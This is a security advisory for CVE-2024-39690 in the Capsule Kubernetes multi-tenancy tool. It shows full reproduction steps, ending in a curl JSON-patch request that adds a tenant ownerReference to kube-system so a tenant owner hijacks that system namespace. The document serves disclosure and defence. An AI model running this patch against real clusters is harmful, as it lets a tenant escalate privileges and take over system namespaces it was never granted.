# Capsule tenant owner with "patch namespace" permission can hijack system namespaces

**GHSA**: GHSA-mq69-4j5w-3qwp | **CVE**: CVE-2024-39690 | **Severity**: high (CVSS 8.5)

**CWE**: CWE-863

**Affected Packages**:
- **github.com/projectcapsule/capsule** (go): <= 0.7.0

## Description

# Attack Vector
Then, let me briefly explain the reasons for the errors mentioned above: 1. The 'kubectl edit' command was used to patch the namespace, but this operation requires both 'get' and 'patch' permissions, hence the error. One should use methods like 'curl' to directly send a PATCH request; 2. The webhook does not intercept patch operations on 'kube-system' because 'kube-system' does not have an ownerReference.

# Below are my detailed reproduction steps
1. Create a test cluster
`kind create cluster --image=kindest/node:v1.24.15 --name=k8s`
2. Install the capsule
`helm install capsule projectcapsule/capsule -n capsule-system --create-namespace`
3. Create a tenant
```
kubectl create -f - << EOF
apiVersion: capsule.clastix.io/v1beta2
kind: Tenant
metadata:
  name: tenant1
spec:
  owners:
  - name: alice
    kind: User
EOF
```
4. Create user alice
```
./create-user.sh alice tenant1 capsule.clastix.io
export KUBECONFIG=alice-tenant1.kubeconfig
```
5. Patch kube-system (The first command is executed in the current shell, while the 2nd and 3rd commands require a different shell window because the current shell is being used as a proxy.)
```
kubectl proxy

export DATA='[{"op": "add", "path": "/metadata/ownerReferences", "value":[{"apiVersion": "capsule.clastix.io/v1beta2", "blockOwnerDeletion": true, "controller": true, "kind": "Tenant", "name": "tenant1", "uid": "ce3f2296-4aaa-45b0-a8fe-879d5096f193"}]}]'

curl http://localhost:8001/api/v1/namespaces/kube-system/ -X PATCH -d "$DATA" -H "Content-Type: application/json-patch+json"
```
7. Check the result
The kube-system is patched successfully.
![image](https://github.com/projectcapsule/capsule/assets/151004196/e2775304-c1f4-494d-ab15-14f6f33e29ec)


# Summary
The tenant-owner can patch any arbitrary namespace that has not been taken over by a tenant (i.e., namespaces without the ownerReference field), thereby gaining control of that namespace.

I would like to express my apologies once again. I have always been sincere in my research and communication, and I did not intend to disturb you on purpose.
